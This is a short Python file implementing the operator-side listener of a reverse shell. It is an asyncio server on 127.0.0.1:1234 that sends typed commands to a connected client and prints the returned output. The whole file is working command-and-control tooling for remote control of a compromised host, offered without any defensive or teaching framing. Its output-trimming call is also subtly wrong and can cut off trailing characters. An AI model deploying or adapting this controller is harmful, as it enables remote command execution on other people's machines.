import asyncio
import subprocess
from asyncio import CancelledError

# Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1234


class ReverseShellHandler:
    """
    Handles interaction with a single reverse shell client.
    """

    def __init__(self, shutdown_event: asyncio.Event):
        self.shutdown_event = shutdown_event

    async def __call__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        client_addr = writer.get_extra_info('peername')
        print(f"[+] Connection established from {client_addr}. Type 'exit' to terminate session.")

        try:
            while True:
                command = input(f"{client_addr}@remote-shell > ").strip()

                if command.lower() == "exit":
                    print("[-] Closing connection and shutting down server...")
                    writer.close()
                    await writer.wait_closed()
                    self.shutdown_event.set()  # Signal the server to shut down
                    break

                if command.lower() == "clear":
                    subprocess.call("clear")
                    continue

                # Send the command to the client
                writer.write(command.encode())
                await writer.drain()

                # Receive and print the response until "__END__"
                response = await reader.readuntil(b"__END__")
                print(response.decode().rstrip("\n__END__"))

        except (EOFError, KeyboardInterrupt):
            print("\n[-] Interrupted by user. Closing connection.")
            writer.close()
            await writer.wait_closed()
            self.shutdown_event.set()


async def run_reverse_shell_server():
    """
    Starts the reverse shell server and listens for incoming connections.
    """
    shutdown_event = asyncio.Event()
    handler = ReverseShellHandler(shutdown_event)

    server = await asyncio.start_server(handler, SERVER_HOST, SERVER_PORT)
    print(f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}")
    try:
        async with server:
            await shutdown_event.wait()  # Wait for the handler to signal shutdown
            print("[-] Shutdown signal received. Closing server...")
            server.close()
            await server.wait_closed()
    except CancelledError:
        print("[-] Server shutdown requested.")


# Entry point
if __name__ == "__main__":
    asyncio.run(run_reverse_shell_server())
